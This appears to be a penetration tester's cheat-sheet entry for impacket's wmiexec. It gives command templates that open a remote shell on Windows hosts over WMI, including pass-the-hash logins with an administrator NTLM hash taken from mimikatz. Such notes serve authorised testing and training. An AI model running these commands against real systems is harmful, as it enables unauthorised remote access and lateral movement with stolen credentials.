---
tags:
---
# wmiexec

Executes a semi-interactive shell using WMI.

Requires `ADMIN$` share to be available. Only works against Active Directory domain accounts and the built-in local administrator account.

## Capabilities

```bash
# Authenticate with credentials
impacket-wmiexec '$DOMAIN/username:password@$IP'

# Authenticate with kerberos
impacket-wmiexec $DOMAIN/username@$IP -k -no-pass

# Authenticate with hash
impacket-wmiexec -hashes :7a38... username@$IP
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38... username@$IP
```

Note: In the hash example, we fill in the left side of the colon with zeros, and the right is the administrators NTLM hash pulled from `mimikatz`
